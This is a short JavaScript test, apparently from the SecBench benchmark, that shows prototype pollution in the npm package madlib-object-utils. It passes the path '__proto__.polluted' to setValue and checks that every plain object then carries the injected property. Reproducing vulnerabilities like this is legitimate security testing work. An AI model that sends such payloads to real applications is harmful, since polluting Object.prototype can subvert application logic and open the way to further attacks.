// Prototype pollution through setValue (SecBench payload).
test("madlib-object-utils prototype pollution", () => {
  const u = require("madlib-object-utils");
  try { u.setValue("__proto__.polluted", {}, "yes"); } catch (e) {}
  expect({}.polluted).toBe("yes");
});
